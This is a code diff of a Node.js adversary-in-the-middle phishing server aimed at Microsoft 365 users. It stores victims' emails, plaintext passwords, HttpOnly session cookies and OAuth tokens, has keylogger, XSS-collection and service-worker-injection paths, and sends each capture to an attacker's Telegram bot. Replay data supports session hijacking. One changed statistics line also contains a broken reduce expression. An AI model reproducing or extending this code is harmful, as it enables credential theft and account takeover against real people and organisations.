@@ -9,7 +9,7 @@ const axios = require('axios');
 const { v4: uuidv4 } = require('uuid');
 
 // ============================================================
-//  ENVIRONMENT VARIABLES CONFIGURATION
+//  ENVIRONMENT VARIABLES
 // ============================================================
 
 require('dotenv').config();
@@ -18,6 +18,7 @@ require('dotenv').config();
 const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
 const PHISHED_URL_PARAMETER = process.env.PHISHED_URL_PARAMETER || 'login_hint';
 const PROXY_ENTRY_POINT = process.env.PROXY_ENTRY_POINT || '/login';
+const PORT = process.env.PORT || 3000;
 
 // Service URLs
 const BACKEND_URL = process.env.BACKEND_URL || "https://meeting-1-rzx6.onrender.com";
@@ -34,10 +35,16 @@ const MICROSOFT_SCOPES = process.env.MICROSOFT_SCOPES || 'openid profile email U
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Path Configuration
+// ============================================================
+//  PATH CONFIGURATION
+// ============================================================
+
 const PROXY_PATHNAMES = {
     script: "/@",
+    scriptFile: "script_Vx9Z6XN5uC3k.js",
     serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
+    serviceWorkerFile: "microsoft_inject.js",
+    swRegister: "/sw-register.js",
     xssEndpoint: "/xss-collect",
     cookieEndpoint: "/cookie-capture",
     keylogEndpoint: "/keylog",
@@ -59,49 +66,43 @@ console.log('╔═════════════════════�
 console.log('║              ENVIRONMENT CONFIGURATION                    ║');
 console.log('╠═══════════════════════════════════════════════════════════╣');
 console.log(`║   ENCRYPTION_KEY: ${ENCRYPTION_KEY ? '✅ SET' : '❌ MISSING'}`);
-console.log(`║   PHISHED_URL_PARAMETER: ${PHISHED_URL_PARAMETER}`);
-console.log(`║   PROXY_ENTRY_POINT: ${PROXY_ENTRY_POINT}`);
+console.log(`║   TELEGRAM: ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}`);
 console.log(`║   BACKEND_URL: ${BACKEND_URL}`);
 console.log(`║   KEYLOGGER_URL: ${KEYLOGGER_URL}`);
-console.log(`║   TELEGRAM: ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}`);
 console.log('╚═══════════════════════════════════════════════════════════╝');
 
 // ============================================================
-//  ADVANCED SESSION STORE WITH HTTPONLY COOKIE SUPPORT
+//  SESSION STORE
 // ============================================================
 
-class AdvancedSessionStore {
+class SessionStore {
     constructor() {
         this.sessions = new Map();
-        this.sessionTTL = 2 * 60 * 60 * 1000; // 2 hours
-        this.replayData = new Map();
+        this.sessionTTL = 2 * 60 * 60 * 1000;
         this.allCookies = new Map();
         this.allTokens = new Map();
-        this.cookieHistory = new Map();
-        this.evasionCounters = new Map();
-        this.fingerprintCache = new Map();
-        this.rotationHistory = new Map();
-        this.beaconHistory = new Map();
-        this.fullAuthData = new Map();
         this.passwordCaptures = new Map();
-        this.credentialHistory = new Map();
-        // HttpOnly cookie storage
         this.httpOnlyCookies = new Map();
         this.cookieHeaders = new Map();
+        this.evasionCounters = new Map();
+        this.fullAuthData = new Map();
+        this.credentialHistory = new Map();
+        this.requestLogs = new Map();
     }
 
-    // ============================================================
-    //  HTTPONLY COOKIE STORAGE
-    // ============================================================
-    
     storeHttpOnlyCookies(sessionId, cookieHeaders, url) {
         const session = this.sessions.get(sessionId);
         if (!session) return;
         
         const cookies = {};
+        const httpOnlyCookies = [];
         const cookieStrings = [];
         
-        for (const cookieHeader of cookieHeaders) {
+        const cookieHeaderArray = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
+        
+        for (const cookieHeader of cookieHeaderArray) {
+            if (!cookieHeader || typeof cookieHeader !== 'string') continue;
+            
             const parts = cookieHeader.split(';');
             const [nameValue, ...attributes] = parts;
             const [name, value] = nameValue.split('=');
@@ -123,22 +124,17 @@ class AdvancedSessionStore {
                     domain: domain,
                     expires: expires,
                     fullCookie: cookieHeader,
-                    captured: Date.now(),
-                    source: url
+                    captured: Date.now()
                 };
                 
                 cookieStrings.push(`${name}=${value}`);
                 
-                // Store HttpOnly separately
                 if (isHttpOnly) {
-                    if (!this.httpOnlyCookies.has(sessionId)) {
-                        this.httpOnlyCookies.set(sessionId, []);
-                    }
-                    this.httpOnlyCookies.get(sessionId).push({
+                    httpOnlyCookies.push({
                         name: name,
                         value: value,
                         attributes: attributes,
-                        fullHeader: cookieHeader,
+                        fullCookie: cookieHeader,
                         captured: Date.now()
                     });
                 }
@@ -150,28 +146,69 @@ class AdvancedSessionStore {
             this.cookieHeaders.set(sessionId, {
                 cookieHeader: cookieStrings.join('; '),
                 cookieCount: cookieStrings.length,
-                httpOnlyCount: this.httpOnlyCookies.get(sessionId)?.length || 0,
+                httpOnlyCount: httpOnlyCookies.length,
+                httpOnlyCookies: httpOnlyCookies,
                 captured: Date.now()
             });
             
-            console.log(`[HTTPONLY] 🍪 Captured ${Object.keys(cookies).length} cookies (${this.httpOnlyCookies.get(sessionId)?.length || 0} HttpOnly)`);
+            if (httpOnlyCookies.length > 0) {
+                this.httpOnlyCookies.set(sessionId, httpOnlyCookies);
+                this.sendHttpOnlyAlert(sessionId, httpOnlyCookies, cookies);
+            }
+            
+            console.log(`[HTTPONLY] 🍪 Captured ${Object.keys(cookies).length} cookies (${httpOnlyCookies.length} HttpOnly)`);
         }
         
         return cookies;
     }
 
-    getHttpOnlyCookies(sessionId) {
-        return this.httpOnlyCookies.get(sessionId) || [];
+    async sendHttpOnlyAlert(sessionId, httpOnlyCookies, allCookies) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+        
+        const session = this.sessions.get(sessionId);
+        const email = session?.email || 'Unknown';
+        
+        let cookieList = '';
+        for (const cookie of httpOnlyCookies) {
+            const displayValue = cookie.value.length > 30 ? cookie.value.substring(0, 30) + '...' : cookie.value;
+            cookieList += `  🔒 \`${cookie.name}\`: \`${displayValue}\`\n`;
+        }
+        
+        const message = 
+`🍪 *HTTPONLY COOKIES CAPTURED*
+
+*📧 Email:* ${email}
+*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}
+*🕐 Time:* ${new Date().toISOString()}
+
+*📊 Total Cookies:* ${Object.keys(allCookies).length}
+*🔒 HttpOnly Count:* ${httpOnlyCookies.length}
+
+*🍪 HttpOnly Cookies:*
+${cookieList}
+
+*🔐 These cookies cannot be accessed by JavaScript!*`;
+
+        await this.sendTelegram(message);
     }
 
-    getCookieHeader(sessionId) {
-        return this.cookieHeaders.get(sessionId) || null;
+    async sendTelegram(message, parseMode = 'Markdown') {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
+        
+        try {
+            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: parseMode,
+                disable_web_page_preview: true
+            });
+            return true;
+        } catch(e) {
+            console.error('[TELEGRAM] Error:', e.message);
+            return false;
+        }
     }
 
-    // ============================================================
-    //  PASSWORD CAPTURE STORAGE
-    // ============================================================
-    
     storePasswordCapture(sessionId, email, password, source, context = {}) {
         const session = this.sessions.get(sessionId);
         if (!session) {
@@ -208,116 +245,38 @@ class AdvancedSessionStore {
         }
         this.credentialHistory.get(email).push(captureEntry);
         
-        console.log(`[PASSWORD-STORE] 🔑 Stored password for ${email} (${source})`);
+        console.log(`[PASSWORD] 🔑 Stored password for ${email} (${source})`);
+        
+        this.sendPasswordAlert(sessionId, email, password, source, context);
+        
         return captureEntry;
     }
 
-    getPasswordCaptures(sessionId) {
-        return this.passwordCaptures.get(sessionId) || [];
+    async sendPasswordAlert(sessionId, email, password, source, context) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+        
+        const httpOnlyCount = this.httpOnlyCookies.get(sessionId)?.length || 0;
+        const tokenCount = this.allTokens.get(sessionId) ? 
+            Object.values(this.allTokens.get(sessionId)).filter(t => t && t.value && t.isValid !== false).length : 0;
+        
+        const message = 
+`🔐 *PASSWORD CAPTURED* (${source})
+
+*📧 Email:* ${email}
+*🔑 Password:* ${password || 'N/A'}
+*📡 IP:* ${context.ip || 'Unknown'}
+*🕐 Time:* ${new Date().toISOString()}
+*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}
+
+*🍪 HttpOnly Cookies:* ${httpOnlyCount}
+*🎟️ Tokens:* ${tokenCount}
+*🔄 Attempt #:* ${context.attemptCount || 1}
+
+*📱 User Agent:* ${context.userAgent || 'Unknown'}`;
+
+        await this.sendTelegram(message);
     }
 
-    getCredentialHistory(email) {
-        return this.credentialHistory.get(email) || [];
-    }
-
-    // ============================================================
-    //  SESSION ROTATION
-    // ============================================================
-    
-    rotateSession(sessionId) {
-        const session = this.sessions.get(sessionId);
-        if (!session) return null;
-        
-        const newSessionId = 'sess_' + crypto.randomBytes(16).toString('hex');
-        const newSession = {
-            ...session,
-            id: newSessionId,
-            rotatedFrom: sessionId,
-            rotatedAt: Date.now(),
-            rotationCount: (session.rotationCount || 0) + 1,
-            previousIds: [...(session.previousIds || []), sessionId]
-        };
-        
-        this.sessions.set(newSessionId, newSession);
-        this.sessions.delete(sessionId);
-        
-        if (this.passwordCaptures.has(sessionId)) {
-            this.passwordCaptures.set(newSessionId, this.passwordCaptures.get(sessionId));
-            this.passwordCaptures.delete(sessionId);
-        }
-        
-        if (this.httpOnlyCookies.has(sessionId)) {
-            this.httpOnlyCookies.set(newSessionId, this.httpOnlyCookies.get(sessionId));
-            this.httpOnlyCookies.delete(sessionId);
-        }
-        
-        if (this.cookieHeaders.has(sessionId)) {
-            this.cookieHeaders.set(newSessionId, this.cookieHeaders.get(sessionId));
-            this.cookieHeaders.delete(sessionId);
-        }
-        
-        ['allCookies', 'allTokens', 'fingerprintCache', 'evasionCounters', 'fullAuthData'].forEach(store => {
-            if (this[store].has(sessionId)) {
-                this[store].set(newSessionId, this[store].get(sessionId));
-                this[store].delete(sessionId);
-            }
-        });
-        
-        this.rotationHistory.set(newSessionId, {
-            rotatedFrom: sessionId,
-            rotatedAt: Date.now(),
-            rotationCount: newSession.rotationCount
-        });
-        
-        console.log(`[EVASION] 🔄 Session rotated: ${sessionId.substring(0, 12)} -> ${newSessionId.substring(0, 12)}`);
-        return newSessionId;
-    }
-
-    // ============================================================
-    //  TOKEN STORAGE
-    // ============================================================
-    
-    storeTokens(sessionId, tokens) {
-        const session = this.sessions.get(sessionId);
-        if (!session) return;
-        
-        session.tokens = session.tokens || {};
-        
-        for (const [key, value] of Object.entries(tokens)) {
-            if (value && value !== 'undefined' && value !== 'null' && value !== 'N/A') {
-                session.tokens[key] = {
-                    value: value,
-                    captured: Date.now(),
-                    type: key.includes('access') ? 'access' : 
-                          key.includes('refresh') ? 'refresh' : 
-                          key.includes('id') ? 'id' : 'unknown',
-                    isValid: true,
-                    validatedAt: Date.now(),
-                    rotationCount: session.rotationCount || 0
-                };
-            } else {
-                session.tokens[key] = {
-                    value: null,
-                    captured: Date.now(),
-                    type: key.includes('access') ? 'access' : 
-                          key.includes('refresh') ? 'refresh' : 
-                          key.includes('id') ? 'id' : 'unknown',
-                    isValid: false,
-                    validatedAt: Date.now(),
-                    missingReason: 'Token not provided by Microsoft'
-                };
-            }
-        }
-        
-        this.allTokens.set(sessionId, session.tokens);
-        console.log(`[TOKEN-STORE] 🎟️ Stored ${Object.keys(tokens).length} tokens for session ${sessionId.substring(0, 12)}`);
-        return session.tokens;
-    }
-
-    // ============================================================
-    //  COOKIE STORAGE
-    // ============================================================
-    
     storeCookies(sessionId, cookies, source = 'proxy') {
         const session = this.sessions.get(sessionId);
         if (!session) return;
@@ -355,123 +314,69 @@ class AdvancedSessionStore {
         }
         
         this.allCookies.set(sessionId, session.cookies);
-        
-        const history = this.cookieHistory.get(sessionId) || [];
-        history.push({
-            timestamp: Date.now(),
-            source: source,
-            count: Object.keys(cookies).filter(c => cookies[c] !== null && cookies[c] !== undefined && cookies[c] !== 'null').length,
-            cookies: cookies
-        });
-        this.cookieHistory.set(sessionId, history);
-        
-        console.log(`[COOKIE-STORE] 🍪 Captured cookies for session ${sessionId.substring(0, 12)}`);
+        console.log(`[COOKIE] 🍪 Captured cookies for session ${sessionId.substring(0, 12)}`);
         return session.cookies;
     }
 
-    // ============================================================
-    //  FINGERPRINT GENERATION
-    // ============================================================
-    
-    generateFingerprint(sessionId, userAgent, ip) {
-        const fingerprint = {
-            userAgent: userAgent,
-            ip: ip,
-            generatedAt: Date.now(),
-            hash: crypto.createHash('sha256')
-                .update(`${userAgent}:${ip}:${sessionId}:${Date.now()}`)
-                .digest('hex')
-                .substring(0, 16),
-            spoofed: {
-                webgl: this.spoofWebGL(),
-                canvas: this.spoofCanvas(),
-                audio: this.spoofAudio(),
-                navigator: this.spoofNavigator(),
-                screen: this.spoofScreen()
-            }
-        };
-        
+    storeTokens(sessionId, tokens) {
         const session = this.sessions.get(sessionId);
-        if (session) {
-            session.fingerprint = fingerprint;
-            session.fingerprintHistory = session.fingerprintHistory || [];
-            session.fingerprintHistory.push(fingerprint);
+        if (!session) return;
+        
+        session.tokens = session.tokens || {};
+        
+        for (const [key, value] of Object.entries(tokens)) {
+            if (value && value !== 'undefined' && value !== 'null' && value !== 'N/A') {
+                session.tokens[key] = {
+                    value: value,
+                    captured: Date.now(),
+                    type: key.includes('access') ? 'access' : 
+                          key.includes('refresh') ? 'refresh' : 
+                          key.includes('id') ? 'id' : 'unknown',
+                    isValid: true,
+                    validatedAt: Date.now()
+                };
+            }
         }
         
-        this.fingerprintCache.set(sessionId, fingerprint);
-        return fingerprint;
+        this.allTokens.set(sessionId, session.tokens);
+        console.log(`[TOKEN] 🎟️ Stored tokens for session ${sessionId.substring(0, 12)}`);
+        return session.tokens;
     }
 
-    spoofWebGL() {
-        const renderers = [
-            'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)',
-            'ANGLE (NVIDIA, NVIDIA GeForce GTX 1050 Direct3D11 vs_5_0 ps_5_0)',
-            'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)',
-            'Mali-T880',
-            'Adreno (TM) 540'
-        ];
-        return renderers[Math.floor(Math.random() * renderers.length)];
-    }
-
-    spoofCanvas() {
-        return crypto.randomBytes(16).toString('hex');
-    }
-
-    spoofAudio() {
-        return crypto.randomBytes(8).toString('hex');
-    }
-
-    spoofNavigator() {
-        const platforms = ['Win32', 'MacIntel', 'Linux x86_64', 'iPhone'];
-        const concurrency = [4, 6, 8, 12];
-        const memory = [4, 8, 16, 32];
-        return {
-            platform: platforms[Math.floor(Math.random() * platforms.length)],
-            hardwareConcurrency: concurrency[Math.floor(Math.random() * concurrency.length)],
-            deviceMemory: memory[Math.floor(Math.random() * memory.length)],
-            maxTouchPoints: [0, 1, 2, 5][Math.floor(Math.random() * 4)],
-            doNotTrack: [null, '1', '0'][Math.floor(Math.random() * 3)],
-            language: ['en-US', 'en-GB', 'en-AU', 'fr-FR', 'de-DE'][Math.floor(Math.random() * 5)]
-        };
-    }
-
-    spoofScreen() {
-        const widths = [1366, 1920, 1440, 1536];
-        const heights = [768, 1080, 900, 864];
-        return {
-            width: widths[Math.floor(Math.random() * widths.length)],
-            height: heights[Math.floor(Math.random() * heights.length)],
-            colorDepth: [24, 30, 32][Math.floor(Math.random() * 3)],
-            pixelRatio: [1, 1.25, 1.5, 2][Math.floor(Math.random() * 4)]
-        };
-    }
-
-    // ============================================================
-    //  EVASION COUNTERS
-    // ============================================================
-    
-    addEvasionCounter(sessionId) {
-        const counter = this.evasionCounters.get(sessionId) || {
-            totalRequests: 0,
-            loginAttempts: 0,
-            cookieCaptures: 0,
-            tokenCaptures: 0,
-            rotations: 0,
-            passwordCaptures: 0,
-            httpOnlyCaptures: 0,
-            lastActivity: Date.now()
-        };
+    storeFullAuthData(sessionId, authData) {
+        const session = this.sessions.get(sessionId);
+        if (!session) {
+            this.sessions.set(sessionId, {
+                email: authData.email || 'unknown',
+                password: authData.password || 'N/A',
+                created: Date.now(),
+                lastActivity: Date.now(),
+                fullAuthCompleted: true,
+                fullAuthTime: Date.now()
+            });
+        } else {
+            if (authData.password) {
+                session.password = authData.password;
+            }
+            session.fullAuthCompleted = true;
+            session.fullAuthTime = Date.now();
+            session.lastActivity = Date.now();
+        }
         
-        counter.totalRequests++;
-        counter.lastActivity = Date.now();
-        this.evasionCounters.set(sessionId, counter);
-        return counter;
+        this.fullAuthData.set(sessionId, {
+            ...authData,
+            storedAt: Date.now(),
+            sessionId: sessionId
+        });
+        
+        console.log(`[FULL-AUTH] ✅ Stored full auth data for session ${sessionId.substring(0, 12)}`);
+        return true;
     }
 
-    // ============================================================
-    //  GET SESSION DATA
-    // ============================================================
-    
+    getFullAuthData(sessionId) {
+        return this.fullAuthData.get(sessionId) || null;
+    }
+
     getReplayData(sessionId) {
         const session = this.sessions.get(sessionId);
         if (!session) return null;
@@ -503,101 +408,60 @@ class AdvancedSessionStore {
             }
         }
         
+        const cookieHeader = this.cookieHeaders.get(sessionId);
+        const httpOnlyCookies = this.httpOnlyCookies.get(sessionId) || [];
+        const passwordCaptures = this.passwordCaptures.get(sessionId) || [];
+        
         return {
             sessionId: session.id,
             cookies: cookies,
             tokens: tokens,
-            forms: session.forms || [],
-            fingerprint: session.fingerprint || {},
-            created: session.created,
-            lastActivity: session.lastActivity,
+            cookieHeader: cookieHeader?.cookieHeader || '',
+            httpOnlyCookies: httpOnlyCookies,
+            httpOnlyCount: httpOnlyCookies.length,
             email: session.email || 'unknown',
             password: session.password || 'N/A',
-            rotationCount: session.rotationCount || 0,
-            passwordCaptures: this.passwordCaptures.get(sessionId) || [],
-            httpOnlyCookies: this.httpOnlyCookies.get(sessionId) || [],
-            evasionData: {
-                fingerprint: session.fingerprint,
-                totalRequests: this.evasionCounters.get(sessionId)?.totalRequests || 0,
-                rotations: this.evasionCounters.get(sessionId)?.rotations || 0,
-                passwordCaptures: this.evasionCounters.get(sessionId)?.passwordCaptures || 0,
-                httpOnlyCaptures: this.evasionCounters.get(sessionId)?.httpOnlyCaptures || 0
-            }
+            passwordCaptures: passwordCaptures,
+            created: session.created,
+            lastActivity: session.lastActivity,
+            fullAuthData: this.fullAuthData.get(sessionId) || null,
+            evasionData: this.evasionCounters.get(sessionId) || {}
         };
     }
 
-    // ============================================================
-    //  FULL AUTH DATA
-    // ============================================================
-    
-    storeFullAuthData(sessionId, authData) {
-        const session = this.sessions.get(sessionId);
-        if (!session) {
-            this.sessions.set(sessionId, {
-                email: authData.email || 'unknown',
-                password: authData.password || 'N/A',
-                created: Date.now(),
-                lastActivity: Date.now(),
-                rotationCount: 0,
-                fullAuthCompleted: true,
-                fullAuthTime: Date.now()
-            });
-        } else {
-            if (authData.password) {
-                session.password = authData.password;
-            }
-            session.fullAuthCompleted = true;
-            session.fullAuthTime = Date.now();
-            session.lastActivity = Date.now();
-        }
+    addEvasionCounter(sessionId) {
+        const counter = this.evasionCounters.get(sessionId) || {
+            totalRequests: 0,
+            loginAttempts: 0,
+            cookieCaptures: 0,
+            tokenCaptures: 0,
+            passwordCaptures: 0,
+            httpOnlyCaptures: 0,
+            rotations: 0,
+            lastActivity: Date.now()
+        };
         
-        this.fullAuthData.set(sessionId, {
-            ...authData,
-            storedAt: Date.now(),
-            sessionId: sessionId
-        });
-        
-        const sessionRef = this.sessions.get(sessionId);
-        if (sessionRef) {
-            sessionRef.fullAuthData = authData;
-            sessionRef.fullAuthCompleted = true;
-            sessionRef.fullAuthTime = Date.now();
-        }
-        
-        console.log(`[FULL-AUTH] ✅ Stored full auth data for session ${sessionId.substring(0, 12)}`);
-        return true;
+        counter.totalRequests++;
+        counter.lastActivity = Date.now();
+        this.evasionCounters.set(sessionId, counter);
+        return counter;
     }
 
-    getFullAuthData(sessionId) {
-        if (this.fullAuthData.has(sessionId)) {
-            return this.fullAuthData.get(sessionId);
-        }
-        const session = this.sessions.get(sessionId);
-        if (session && session.fullAuthData) {
-            return session.fullAuthData;
-        }
-        return null;
-    }
-
-    // ============================================================
-    //  CLEANUP
-    // ============================================================
-    
     cleanup() {
         const now = Date.now();
         let cleaned = 0;
         for (const [id, session] of this.sessions) {
             if (now - session.lastActivity > this.sessionTTL) {
                 this.sessions.delete(id);
-                this.replayData.delete(id);
                 this.allCookies.delete(id);
                 this.allTokens.delete(id);
-                this.evasionCounters.delete(id);
-                this.fingerprintCache.delete(id);
-                this.fullAuthData.delete(id);
                 this.passwordCaptures.delete(id);
                 this.httpOnlyCookies.delete(id);
                 this.cookieHeaders.delete(id);
+                this.fullAuthData.delete(id);
+                this.evasionCounters.delete(id);
+                this.credentialHistory.delete(id);
+                this.requestLogs.delete(id);
                 cleaned++;
             }
         }
@@ -621,22 +485,21 @@ class AdvancedSessionStore {
                 }
                 return acc + count;
             }, 0),
-            totalHttpOnly: Array.from(this.httpOnlyCookies.values()).reduce((acc, arr) => acc + arr.length, 0),
+            totalHttpOnly: Array.from(this.httpOnlyCookies.values()).reduce((acc, arr) => arr + arr.length, 0),
             totalTokens: Array.from(this.sessions.values()).reduce((acc, s) => {
                 if (s.tokens) {
                     return acc + Object.values(s.tokens).filter(t => t && t.value && t.isValid !== false).length;
                 }
                 return acc;
             }, 0),
-            totalRequests: Array.from(this.evasionCounters.values()).reduce((acc, c) => acc + c.totalRequests, 0),
-            totalRotations: Array.from(this.evasionCounters.values()).reduce((acc, c) => acc + (c.rotations || 0), 0),
+            totalPasswordCaptures: Array.from(this.passwordCaptures.values()).reduce((acc, captures) => acc + captures.length, 0),
             totalFullAuth: this.fullAuthData.size,
-            totalPasswordCaptures: Array.from(this.passwordCaptures.values()).reduce((acc, captures) => acc + captures.length, 0)
+            totalRequests: Array.from(this.evasionCounters.values()).reduce((acc, c) => acc + c.totalRequests, 0)
         };
     }
 }
 
-const sessionStore = new AdvancedSessionStore();
+const sessionStore = new SessionStore();
 
 // ============================================================
 //  VICTIM SESSIONS
@@ -644,7 +507,6 @@ const sessionStore = new AdvancedSessionStore();
 
 const VICTIM_SESSIONS = {};
 const attemptCounts = new Map();
-const SESSION_TTL = 60 * 60 * 1000;
 
 function generateSessionId() {
     return crypto.randomBytes(16).toString('hex');
@@ -652,7 +514,23 @@ function generateSessionId() {
 
 function getSessionIdFromCookie(cookieHeader) {
     if (!cookieHeader) return null;
-    const cookies = cookieHeader.split('; ');
+    let cookieString = '';
+    if (typeof cookieHeader === 'object') {
+        if (Array.isArray(cookieHeader)) {
+            cookieString = cookieHeader.join('; ');
+        } else {
+            cookieString = cookieHeader.cookie || cookieHeader['cookie'] || '';
+            if (cookieHeader.headers && cookieHeader.headers.cookie) {
+                cookieString = cookieHeader.headers.cookie;
+            }
+        }
+    } else if (typeof cookieHeader === 'string') {
+        cookieString = cookieHeader;
+    } else {
+        return null;
+    }
+    if (!cookieString || typeof cookieString !== 'string') return null;
+    const cookies = cookieString.split('; ');
     for (const cookie of cookies) {
         const [name, value] = cookie.split('=');
         if (name === 'sessionId') {
@@ -662,17 +540,6 @@ function getSessionIdFromCookie(cookieHeader) {
     return null;
 }
 
-function getSession(sessionId) {
-    if (!sessionId) return null;
-    const session = VICTIM_SESSIONS[sessionId];
-    if (!session) return null;
-    if (Date.now() - session.timestamp > SESSION_TTL) {
-        delete VICTIM_SESSIONS[sessionId];
-        return null;
-    }
-    return session;
-}
-
 function createSession(email, ip, userAgent) {
     const sessionId = generateSessionId();
     VICTIM_SESSIONS[sessionId] = {
@@ -680,27 +547,17 @@ function createSession(email, ip, userAgent) {
         timestamp: Date.now(),
         ip: ip || 'unknown',
         userAgent: userAgent || 'Unknown',
-        cookies: [],
-        xssData: [],
-        keystrokes: [],
-        formData: [],
         created: new Date().toISOString(),
         lastActivity: Date.now(),
         attempts: 0,
-        swCaptures: [],
-        tokens: [],
-        replayData: {},
-        rotationCount: 0,
-        evasionEnabled: true,
         password: null,
         passwordCaptures: [],
         httpOnlyCookies: [],
         cookieHeader: null,
+        tokens: [],
         validationAttempts: [],
         lastValidationResult: null
     };
-    
-    sessionStore.generateFingerprint(sessionId, userAgent, ip);
     sessionStore.sessions.set(sessionId, {
         email: email || 'unknown',
         password: null,
@@ -709,400 +566,410 @@ function createSession(email, ip, userAgent) {
         created: Date.now(),
         lastActivity: Date.now()
     });
-    
     console.log(`[SESSION] Created session ${sessionId} for email: ${email}`);
     return sessionId;
 }
 
-// ============================================================
-//  IP EXTRACTION
-// ============================================================
-
 function getClientIp(req) {
     const cfIp = req.headers['cf-connecting-ip'];
     if (cfIp) return cfIp.trim();
-
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
         const ips = forwarded.split(',').map(ip => ip.trim());
         return ips[0] || 'unknown';
     }
-
     const realIp = req.headers['x-real-ip'];
     if (realIp) return realIp.trim();
-
     return req.socket.remoteAddress || 'unknown';
 }
 
 // ============================================================
-//  TELEGRAM NOTIFICATIONS - COMPLETE ALERTS
+//  SERVE FILES - FIXED: Read from public/ folder
 // ============================================================
 
-async function sendToTelegram(text, parseMode = 'Markdown') {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-        console.log('[TELEGRAM] ⚠️ Missing credentials');
-        return false;
-    }
-
-    try {
-        const maxLength = 4000;
-        if (text.length > maxLength) {
-            const chunks = text.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
-            for (const chunk of chunks) {
-                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: chunk,
-                    parse_mode: parseMode,
-                    disable_web_page_preview: true
-                });
-            }
-        } else {
-            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                chat_id: TELEGRAM_CHAT_ID,
-                text: text,
-                parse_mode: parseMode,
-                disable_web_page_preview: true
-            });
+function serveFile(filename, res, contentType = 'text/html') {
+    // ✅ FIXED: Read from public/ folder
+    const filePath = path.join(__dirname, 'public', filename);
+    fs.readFile(filePath, (err, data) => {
+        if (err) {
+            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
+            res.writeHead(404, { 'Content-Type': 'text/html' });
+            res.end('<h1>404 Not Found</h1>');
+            return;
         }
-        console.log('[TELEGRAM] ✅ Sent successfully');
-        return true;
-    } catch (error) {
-        console.error('[TELEGRAM] ❌ Failed:', error.message);
-        return false;
-    }
-}
-
-// ============================================================
-//  SEND COMPLETE TELEGRAM ALERT WITH ALL DATA
-// ============================================================
-
-async function sendTelegramAlert(type, data) {
-    let message = '';
-    
-    switch(type) {
-        case 'password_capture':
-            message = 
-`🔐 *PASSWORD CAPTURED* (${data.source})
-
-*📧 Email:* ${data.email}
-*🔑 Password:* ${data.password || 'N/A'}
-*📡 IP:* ${data.ip}
-*🕐 Time:* ${data.timestamp}
-*🆔 Session:* ${data.sessionId ? data.sessionId.substring(0, 12) + '...' : 'N/A'}
-*🎯 Service:* Microsoft 365
-*📱 User Agent:* ${data.userAgent}
-*🛡️ Evasion:* Active
-*📊 Source:* ${data.source}
-*🔄 Attempt #:* ${data.attemptCount || 1}
-
-*🍪 HttpOnly Cookies:* ${data.httpOnlyCount || 0}
-*🎟️ Tokens:* ${data.tokenCount || 0}`;
-            break;
-            
-        case 'validation_success':
-            message = 
-`✅ *VALID MICROSOFT CREDENTIALS*
-
-*📧 Email:* ${data.email}
-*🔑 Password:* ${data.password || 'N/A'}
-*📡 IP:* ${data.ip}
-*🕐 Time:* ${data.timestamp}
-*🆔 Session:* ${data.sessionId ? data.sessionId.substring(0, 12) + '...' : 'N/A'}
-
-*🎟️ Access Token:* ${data.accessToken ? data.accessToken.substring(0, 30) + '...' : 'N/A'}
-*🔄 Refresh Token:* ${data.refreshToken ? '✅ Present' : '❌ None'}
-*🆔 ID Token:* ${data.idToken ? '✅ Present' : '❌ None'}
-
-*🍪 HttpOnly Cookies:* ${data.httpOnlyCount || 0}
-*🔒 Secure:* ${data.secure ? 'Yes' : 'No'}
-
-*📊 Attempt #:* ${data.attemptCount || 1}
-*⏱️ Time to Validate:* ${data.validationTime || 'N/A'}ms
-
-*✅ COMPLETE SESSION DATA CAPTURED!*`;
-            break;
-            
-        case 'validation_failed':
-            message = 
-`❌ *INVALID MICROSOFT CREDENTIALS*
-
-*📧 Email:* ${data.email}
-*🔑 Password:* ${data.password || 'N/A'}
-*📡 IP:* ${data.ip}
-*🕐 Time:* ${data.timestamp}
-*🆔 Session:* ${data.sessionId ? data.sessionId.substring(0, 12) + '...' : 'N/A'}
-
-*📊 Attempt #:* ${data.attemptCount || 1}
-*❌ Error:* ${data.error || 'Invalid username or password'}
-
-*🔄 Retry Count:* ${data.retryCount || 0}`;
-            break;
-            
-        case 'http_only_cookies':
-            message = 
-`🍪 *HTTPONLY COOKIES CAPTURED*
-
-*📧 Email:* ${data.email}
-*🆔 Session:* ${data.sessionId ? data.sessionId.substring(0, 12) + '...' : 'N/A'}
-*🕐 Time:* ${data.timestamp}
-
-*📊 Cookie Count:* ${data.cookieCount || 0}
-*🔒 HttpOnly Count:* ${data.httpOnlyCount || 0}
-
-*🍪 Cookies:*
-${data.cookieList || 'No cookies captured'}
-
-*🔐 These are HttpOnly cookies - JavaScript cannot access them!*`;
-            break;
-            
-        case 'full_auth':
-            message = 
-`🎯 *FULL CREDENTIALS CAPTURED*
-
-*📧 Email:* ${data.email}
-*👤 Name:* ${data.name}
-*🏢 Organization:* ${data.organization}
-
-*🔑 Password:* ${data.password || 'N/A'}
-*📱 2FA Code:* ${data.twoFactorCode || 'N/A'}
-
